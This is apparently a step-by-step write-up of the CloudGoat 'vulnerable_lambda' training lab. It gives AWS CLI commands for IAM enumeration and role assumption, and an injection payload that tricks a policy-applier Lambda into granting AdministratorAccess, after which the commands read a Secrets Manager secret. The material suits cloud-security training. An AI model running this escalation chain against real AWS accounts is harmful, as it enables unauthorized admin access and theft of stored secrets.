## Step 1: Get Permissions for IAM User `bilbo`
Before anything else, check what permissions the `bilbo` user currently has.

### Commands
```bash
# Get the ARN and full name of the current user
aws --profile bilbo --region us-east-1 sts get-caller-identity

# List policies directly attached to the user (if any)
aws --profile bilbo --region us-east-1 iam list-user-policies --user-name bilbo

# List all permissions assigned via a user policy
aws --profile bilbo --region us-east-1 iam get-user-policy --user-name bilbo --policy-name [your_policy_name]
```
### What This Does
- The first command confirms that you're using the right AWS profile (`bilbo`).
- The second command checks if there are any user-specific policies.
- The third command retrieves details about a specific policy.

---

## Step 2: Find and Assume a Privileged Role
The next step is to list all roles in the AWS account and look for one that `bilbo` can assume.

### Commands
```bash
# List all roles in the AWS account (filtering for CloudGoat roles)
aws --profile bilbo --region us-east-1 iam list-roles | grep cg-

# Get all policies attached to the identified role
aws --profile bilbo --region us-east-1 iam list-role-policies --role-name [cg-target-role]

# Assume the role that allows invoking Lambda functions
aws --profile bilbo --region us-east-1 sts assume-role --role-arn [cg-lambda-invoker_arn] --role-session-name assumed-role
```

### What This Does
- Lists all roles, looking for ones associated with CloudGoat (`cg-`).
- Checks what policies are attached to a promising role.
- If the role is assumable, we assume it to gain higher privileges.

---

## Step 3: Identify the Target (Vulnerable) Lambda
Once you have assumed the Lambda-invoker role, list all available Lambda functions to find the vulnerable one.

### Command
```bash
# List all Lambda functions
aws --profile assumed_role --region us-east-1 lambda list-functions
```

### What This Does
- Retrieves all Lambda functions in the AWS account.
- Identifies the one belonging to CloudGoat (it will likely start with `cg-`).
- This Lambda can apply AWS policies to users—our attack target.

---

## Step 4: Examine the Lambda Function’s Code
The Lambda function contains source code that determines how it processes requests. We need to look at it for vulnerabilities.

### Command
```bash
# Get detailed information about the vulnerable Lambda, including its source code package
aws --profile assumed_role --region us-east-1 lambda get-function --function-name [policy_applier_lambda_name]
```

### What This Does
- Returns details about the function, including a **download URL** for its deployment package.
- The package contains the Lambda function’s code.
- Look for:
  - **How it processes input** (is it properly sanitizing input?).
  - **Any database structure hints** in the comments.
  - **Potential injection vulnerabilities**.

---

## Step 5: Exploit the Lambda Function
The function is vulnerable to an injection attack. We can exploit this by crafting a malicious payload.

### Steps
1. Create a JSON file (`payload.json`) with a specially crafted policy name:
   ```json
   {
       "policy_names": ["AdministratorAccess' -- "],
       "user_name": "[bilbo_user_name_here]"
   }
   ```
2. Use the AWS CLI to invoke the Lambda function with this payload.

### Commands
```bash
# Send the injection payload to the Lambda function
aws --profile assumed_role --region us-east-1 lambda invoke --function-name [policy_applier_lambda_name] --cli-binary-format raw-in-base64-out --payload file://./payload.json out.txt

# Check the output to confirm success
cat out.txt
```

### What This Does
- The JSON payload **injects an extra policy application command** by escaping a string.
- The Lambda function grants `AdministratorAccess` to `bilbo`, making them an admin.

---

## Step 6: Use Admin Privileges to Retrieve the Secret
Now that `bilbo` has admin rights, we can access AWS Secrets Manager to retrieve the stored secret.

### Commands
```bash
# List all secrets stored in AWS Secrets Manager
aws --profile bilbo --region us-east-1 secretsmanager list-secrets

# Retrieve the value of a specific secret
aws --profile bilbo --region us-east-1 secretsmanager get-secret-value --secret-id [ARN_OF_TARGET_SECRET]
```

### What This Does
- The first command lists all available secrets.
- The second command retrieves the actual secret value.

---

## Scenario Clean up
- Do not forget to destroy the scenario so you do not get charged by AWS. 
  ```bash
  ./cloudgoat.py destroy vulnerable_lambda
  ```
